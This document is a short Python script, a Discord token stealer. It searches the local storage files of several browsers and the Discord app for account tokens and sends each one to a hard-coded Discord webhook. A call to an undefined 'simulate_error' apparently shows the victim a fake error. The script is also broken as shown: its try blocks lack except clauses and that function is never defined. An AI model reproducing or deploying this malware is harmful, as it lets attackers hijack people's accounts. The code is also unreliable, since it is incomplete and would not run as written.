import os
import re
import requests
import sys

def send_to_webhook(embed, webhook_url):
    payload = {
        'embeds': [embed]
    }
    try:
        response = requests.post(webhook_url, json=payload)

def find_discord_token(webhook_url):
    paths = {
        'chrome': os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
        'firefox': os.path.expanduser('~') + r'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'discord_app': os.path.expanduser('~') + r'\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
        'opera_gx': os.path.expanduser('~') + r'\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Local Storage\\leveldb'
    }

    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')

    found_token = False

    for browser, path in paths.items():
        try:
            if os.path.exists(path):
                for filename in os.listdir(path):
                    if filename.endswith('.ldb') or filename.endswith('.log'):
                        with open(os.path.join(path, filename), 'r', errors='ignore') as file:
                            content = file.read()
                            tokens = token_pattern.findall(content)
                            if tokens:
                                for token in tokens:
                                    found_token = True
                                    embed = {
                                        'title': 'Discord Token Found',
                                        'description': f'Token found in {browser} storage.',
                                        'color': 15258703,
                                        'fields': [
                                            {
                                                'name': 'Token',
                                                'value': token,
                                                'inline': False
                                            },
                                            {
                                                'name': 'Browser/App',
                                                'value': browser,
                                                'inline': False
                                            }
                                        ]
                                    }
                                    send_to_webhook(embed, webhook_url)
                                    

    if found_token:
        sys.exit()
    


if __name__ == "__main__":
    simulate_error()

    webhook_url = 'https://discord.com/api/webhooks/1407764272414724126/v5eTwbJPyXiZsQciMiGzHLoPyBtnYToCnc2NKfuhMBiRdsqF0yABhJqL95PzFAagXp5Q' # YOUR WEBHOOK HERE!!!!
    find_discord_token(webhook_url)
